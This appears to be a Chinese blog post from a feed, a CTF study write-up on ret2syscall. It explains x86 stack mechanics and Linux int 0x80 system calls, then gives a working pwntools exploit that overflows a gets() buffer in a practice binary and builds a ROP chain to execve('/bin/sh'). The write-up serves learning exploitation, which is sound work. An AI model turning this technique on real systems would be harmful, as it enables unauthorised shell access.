    <content type="html"><![CDATA[<h1 id="Ret2Syscall"><a href="#Ret2Syscall" class="headerlink" title="Ret2Syscall"></a>Ret2Syscall</h1><p>大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret2syscall 的总结</p><p>先附上有点模糊了的知识：</p><ul><li>x86下 ip 调用指令的过程：</li></ul><blockquote><p>从 cs:ip 指向的内存单元读取指令，读取指令进入缓冲寄存器；</p><p>ip += 所读指令的长度，从而指向下一条指令；</p><p>执行指令，然后返回第一步</p></blockquote><ul><li>入栈 push 操作的本质：（pop就是反过来）</li></ul><blockquote><p>esp 寄存器中的内容减2，使得 ss:sp 指向新的栈顶单元</p><p>将数据传入这个新的栈顶单元</p></blockquote><ul><li>call 和 ret 的原理</li></ul><blockquote><p>1、call： 先push ip（当前指令的下一条指令的地址压入栈）然后 jmp near ptr 标号</p><p>2、ret ：pop ip （栈顶出栈给 ip，让ip继续执行之前指令后面的指令） </p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Ret2Syscall，即控制程序执行系统调用，获取shell。</p><p>贴上wiki上面关于syscall的解释：</p><blockquote><p><strong>系统调用（system call）</strong>，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信</p><p><strong>用户空间（用户态）和内核空间（内核态）</strong>：操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。</p></blockquote><p><img src="/2019/12/06/Ret2Syscall/syscall.png" alt></p><p>那我们得知道一个应用程序可以如何调用系统调用，才能利用系统调用里面的系统函数（用Linux进行说明），应用程序调用系统调用的过程是：</p><blockquote><ol><li>把系统调用的编号存入 EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发 0x80 号中断（int 0x80）；</li></ol></blockquote><p>同时附上操作系统实现系统调用的过程：</p><blockquote><ol><li>应用程序调用库函数（API）；</li><li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li><li>中断处理函数返回到 API 中；</li><li>API 将 EAX 返回给应用程序。</li></ol></blockquote><p>现在知道了通过 int 80h 我们就能在程序中调用系统调用，这里附上 Linux 系统调用表：</p><table><thead><tr><th>%eax</th><th>系统调用名</th><th>源代码</th><th>%ebx</th><th>%ecx</th><th>%edx</th><th>%esx</th><th>通过堆栈</th></tr></thead><tbody><tr><td>1</td><td>sys_exit</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td>sys_fork</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td>sys_read</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>4</td><td>sys_write</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td></tr><tr><td>5</td><td>sys_open</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>6</td><td>sys_close</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td>sys_waitpid</td><td><a href="file:///usr/src/linux/kernel/exit.c">kernel/exit.c</a></td><td>pid_t</td><td>unsigned int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>8</td><td>sys_creat</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td>sys_link</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td>sys_unlink</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td>sys_execve</td><td><a href="file:///usr/src/linux/arch/i386/kernel/process.c">arch/i386/kernel/process.c</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td>sys_chdir</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td>sys_time</td><td><a href="file:///usr/src/linux/kernel/time.c">kernel/time.c</a></td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td>sys_mknod</td><td><a href="file:///usr/src/linux/fs/namei.c">fs/namei.c</a></td><td>const char *</td><td>int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#dev_t" target="_blank" rel="noopener">dev_t</a></td><td>-</td><td>-</td></tr><tr><td>15</td><td>sys_chmod</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#mode_t" target="_blank" rel="noopener">mode_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td>sys_lchown</td><td><a href="file:///usr/src/linux/fs/open.c">fs/open.c</a></td><td>const char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>18</td><td>sys_stat</td><td><a href="file:///usr/src/linux/fs/stat.c">fs/stat.c</a></td><td>char *</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>19</td><td>sys_lseek</td><td><a href="file:///usr/src/linux/fs/read_write.c">fs/read_write.c</a></td><td>unsigned int</td><td><a href="http://fpc-mips.sourceforge.net/LinuxSyscall_cn.html#off_t" target="_blank" rel="noopener">off_t</a></td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>20</td><td>sys_getpid</td><td><a href="file:///usr/src/linux/kernel/sched.c">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用 ctf-wiki 上面的 ret2syscall（在我本地的文件名为 pwn） ，基本信息就直接说了。下面是 main 的代码，还是 gets 栈溢出然后控制程序执行。通过 cyclic 可以得到栈溢出到返回地址的偏移地址是112；然后程序是32位，开启了NX保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在原程序里面是找不到系统命令直接可以 ret 的，于是我们得使用到syscall。</p><p>在这里我们决定构成下面这个系统调用： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">'/bin/sh'</span>);</span><br></pre></td></tr></table></figure><p>对照表，我们能看到要控制的寄存器是 eax 和ebx  ，那么就可以开始操作了。</p><p>首先我们用 ROPgadget 看一下我们能是用到的 gadgets，首先看 eax , 命令如图所示：</p><p><img src="/2019/12/06/Ret2Syscall/ret2syscall-1.png" alt></p><p>里面第二个地址的 gadget 干脆利落只控制 eax，直接存起来。我们还得继续寻找 ebx 和  int 0x80 和 /bin/sh 的 rop 链。</p><p>然后我们继续寻找 ebx :</p><p><img src="/2019/12/06/Ret2Syscall/syscall-2.png" alt></p><p>可以迅速观察到里面的 0x0806eb90 这个地址直接操作了 ebx 、ecx 和 edx ，完美的选择，存下来。</p><p>那么剩下来的就只有找到字符串  /bin/sh 和 int 0x80 的位置了：</p><p><img src="/2019/12/06/Ret2Syscall/syscall-3.png" alt></p><p>找到 /bin/sh 的位置，继续找 int 0x80 ：</p><p><img src="/2019/12/06/Ret2Syscall/syscall-4.png" alt></p><p>要素都集齐了，下面开始了 rop 之旅，附上自己的 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"?"</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>下面用详细大白话解释exp：</p><blockquote><p>112个 a 控制溢出到返回地址，我们设置返回地址为 pop_eax 操作的地址。当 ip 运行到这个地址返回时，就会跳去执行 pop eax 的操作了；同时 esp 在读完这个返回地址后继续往下，指向 0xb 这个数据单元。在 ip 读完 pop eax 指令，就会把当前栈顶的值赋值给 eax，也就是把 0xb 赋值给 eax ，那么我们的第一步目的就达成了。</p><p>然后在栈弹给值 0xb 给 eax 后，栈指针继续往下走指向了 ebx 那一串 pop 指令所在地址，同时ip 会继续走到了执行 ret 的那条指令的位置（ pop eax 后的 ret 操作）。 ret 本质（模糊知识点起作用了）就是把当前栈指向的地址（也就是 ebx 的那一串 pop 指令的地址）返回给 ip 。然后 ip 就会傻傻的跑去执行那一串 pop 操作了，esp也傻傻的继续往下走（指向了payload中的第一个0） 。</p><p>那一串 pop 操作顺序是 pop edx；pop ecx；pop ebx；ret  ，一步一步对应就会是 ：弹出栈顶给 edx（edx被赋值为0）-&gt;  esp继续走（esp指向了第二个0）然后 ip 也继续走去执行 pop ecx  -&gt;  弹出栈顶给 ecx（ecx被赋值为0），然后 ip 也继续走去执行 pop ebx  -&gt; esp继续走 -&gt; 弹出栈顶给 ebx （ ebx 被赋值了 /bin/sh） -&gt; esp继续往下走（指向了 int 0x80）-&gt; ret（弹出栈顶 int 0x80 的值给 ip ，ip跑去执行 int 0x 80h 进入中断）。</p></blockquote><p>至此 rop 链构建成功，成功getshell。</p><p><img src="/2019/12/06/Ret2Syscall/shell.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>系统调用好用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ret2Syscall&quot;&gt;&lt;a href=&quot;#Ret2Syscall&quot; class=&quot;headerlink&quot; title=&quot;Ret2Syscall&quot;&gt;&lt;/a&gt;Ret2Syscall&lt;/h1&gt;&lt;p&gt;大二的时候学汇编觉得很憨，现在觉得自己才是憨。今天写一下简单 ret
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
